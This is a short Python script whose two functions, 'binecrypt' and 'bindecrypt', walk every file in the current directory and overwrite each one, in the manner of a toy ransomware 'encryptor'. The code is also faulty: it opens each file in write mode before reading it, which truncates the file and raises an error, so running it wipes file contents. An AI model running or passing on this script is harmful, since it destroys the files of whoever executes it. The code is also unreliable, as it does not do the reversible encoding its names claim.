import os

def binecrypt():
    pwd = os.listdir()
    for i in pwd:
        if i == __file__:
            pass
        else:
            var = open(f'{i}','w').read()
            binary = " ".join(format(ord(c),'b') for c in var)
            with open(f'{i}','w') as f:
                f.write(binary)

def bindecrypt():
    pwd = os.listdir()
    for i in pwd:
        if i == __file__:
            pass
        else:
            var2 = open(f'{i}','w').read()
            normalize = "".join(chr(int(c,2)) for c in var2.split(" "))
            with open(f'{i}','w') as f:
                f.write(normalize)
